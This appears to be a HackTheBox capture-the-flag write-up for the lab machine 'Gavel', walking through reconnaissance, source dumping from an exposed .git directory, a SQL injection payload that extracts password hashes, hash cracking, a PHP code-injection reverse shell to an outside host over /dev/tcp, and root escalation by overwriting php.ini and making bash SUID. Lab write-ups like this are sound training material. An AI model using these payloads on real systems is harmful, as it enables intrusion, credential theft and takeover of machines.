# **Gavel - HackTheBox**

*Target Ip. Address: 10.129.253.62*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.253.62
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 09:34 +0000
Nmap scan report for 10.129.253.62
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://gavel.htb/
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.78 seconds
```

So, we have 2 open ports. Port 22 (ssh) and Port 80 (http). Let's edit the hosts file.

```bash
kali@kali:cat /etc/hosts
10.129.253.62   gavel.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

<img width="1288" height="947" alt="image" src="https://github.com/user-attachments/assets/cec52120-1f31-4e3f-9d73-d2fd1f9bc0ce" />

We have a standard website. We will start by registering in the website.

Nothing interesting that might help. Let's do a directory bruteforcing.

```bash
kali@kali:dirb http://gavel.htb/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Mar 10 09:40:26 2026
URL_BASE: http://gavel.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://gavel.htb/ ----
+ http://gavel.htb/.git/HEAD (CODE:200|SIZE:23)
+ http://gavel.htb/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://gavel.htb/assets/
==> DIRECTORY: http://gavel.htb/includes/
+ http://gavel.htb/index.php (CODE:200|SIZE:14018)
==> DIRECTORY: http://gavel.htb/rules/
+ http://gavel.htb/server-status (CODE:403|SIZE:274)

---- Entering directory: http://gavel.htb/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://gavel.htb/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://gavel.htb/rules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Tue Mar 10 09:54:45 2026
DOWNLOADED: 4612 - FOUND: 4
```

Wow, we have .git avialable. Let's download the source code directly.

```bash
kali@kali:git-dumper http://gavel.htb/.git/ ./gavel
[-] Testing http://gavel.htb/.git/HEAD [200]
[-] Testing http://gavel.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://gavel.htb/.git/ [200]
.
.
.
```

<img width="1286" height="653" alt="Screenshot 2026-03-10 153435" src="https://github.com/user-attachments/assets/b7d964b4-3722-4111-aacb-e72177d72362" />

Looking at the source code, we have a possible SQL injection at user_id parameter.

We will use the following payload.

```payload
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```

<img width="1286" height="947" alt="Screenshot 2026-03-10 155649" src="https://github.com/user-attachments/assets/d5a89f9c-6920-4aab-a84d-8447e9cb41fb" />

We have the bcrypt hash for auctioneer. Let's crack it.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mi...t1        (?)     
1g 0:00:00:20 DONE (2026-03-10 10:13) 0.04770g/s 145.9p/s 145.9c/s 145.9C/s iamcool..memories
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We log in with the credentials, we get.

<img width="1285" height="891" alt="Screenshot 2026-03-10 160543" src="https://github.com/user-attachments/assets/33316ecc-d255-4d4d-b4bc-599ad3c5c957" />

Another code snippet in bid_handler.php, we see the function that creates a new php function. Since your input is being placed inside a function body, you can simply write standard PHP code. The code expects you to return a boolean, but you can execute system commands before that.

We will use the following payload.

```payload
system('bash -c "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1"'); return true;
```

<img width="1286" height="951" alt="Screenshot 2026-03-10 160951" src="https://github.com/user-attachments/assets/d0379a84-47cd-406b-8b7c-9851678a8348" />

Start a listener.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.60 • 172.17.0.1 • 172.18.0.1 • 10.10.14.21
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

<img width="1285" height="944" alt="Screenshot 2026-03-10 161253" src="https://github.com/user-attachments/assets/294cdd52-bec0-4f04-a5dc-c028b987e01c" />

Enter the bid amount on the item, you changed the rule. After clicking on place bid, out rule gets executed and we receive a reverse shell.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.60 • 172.17.0.1 • 172.18.0.1 • 10.10.14.21
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)                                                                                     
[+] Got reverse shell from gavel~10.129.253.62-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/gavel~10.129.253.62-Linux-x86_64/2026_03_10-10_27_05-470.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from gavel~10.129.253.62-Linux-x86_64 😍 Assigned SessionID <2>
www-data@gavel:/var/www/html/gavel/includes$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We receive a shell as www-data.

```bash
www-data@gavel:/home$ su auctioneer
Password: 
auctioneer@gavel:/home$ id
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
```

The same password we cracked before works for the user auctioneer.

Now, we can grab our first flag.

```bash
auctioneer@gavel:~$ cat user.txt 
85.....07
```

We saw that we are part of gavel-seller group, let's see if that group has anything for us.

```bash
auctioneer@gavel:~$ find / -group "gavel-seller" 2>/dev/null
/run/gaveld.sock
/usr/local/bin/gavel-util
```

We have an interesting binary, let's see what it does.

```bash
auctioneer@gavel:/opt/gavel$ /usr/local/bin/gavel-util
Usage: /usr/local/bin/gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

So, we can submit a YAML format file to submit new items.

```bash
auctioneer@gavel:/opt/gavel$ cat sample.yaml 
---
item:
  name: "Dragon's Feathered Hat"
  description: "A flamboyant hat rumored to make dragons jealous."
  image: "https://example.com/dragon_hat.png"
  price: 10000
  rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```

We have a sample YAML format. That's helpful.

```bash
auctioneer@gavel:/opt/gavel/.config/php$ cat php.ini
engine=On
display_errors=On
display_startup_errors=On
log_errors=Off
error_reporting=E_ALL
open_basedir=/opt/gavel
memory_limit=32M
max_execution_time=3
max_input_time=10
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
scan_dir=
allow_url_fopen=Off
allow_url_include=Off
```

But, we have some filters that will block us, but we have file_put_contents missing in disable_functions parameter. We can abuse this to replace this php.ini file.

```bash
auctioneer@gavel:~$ cat /opt/gavel/.config/php/php.ini
engine=On
display_errors=On
open_basedir=
disable_functions=
auctioneer@gavel:~$ cat php_fixed.yaml 
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
```

Now, we submit this yaml file to the gavel-uti binary.

```bash
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/php_fixed.yaml
Item submitted for review in next auction
```

Wait for some time, and verify.

```bash
auctioneer@gavel:~$ cat /opt/gavel/.config/php/php.ini
engine=On
display_errors=On
open_basedir=
disable_functions=
```

That was success. Now, we can create a yaml file to make a SUID /bin/bash.

```bash
auctioneer@gavel:~$ cat exploit.yaml 
name: exploit
description: make suid bash
image: "x.png"
price: 1
rule_msg: "Givemeroot"
rule: system('chmod +s /bin/bash'); return false;
```

That is set, let's submit the yaml to binary.

```bash
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/exploit.yaml
Item submitted for review in next auction
```

Wait for some time and verify.

```bash
auctioneer@gavel:~$ \ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

That was success. Let's become root.

```bash
auctioneer@gavel:~$ /bin/bash -p
bash-5.1# id
uid=1001(auctioneer) gid=1002(auctioneer) euid=0(root) egid=0(root) groups=0(root),1001(gavel-seller),1002(auctioneer)
```

So, we are root. Let's read the final flag and end this challenge.

```bash
bash-5.1# cat root.txt 
59.....fb
```
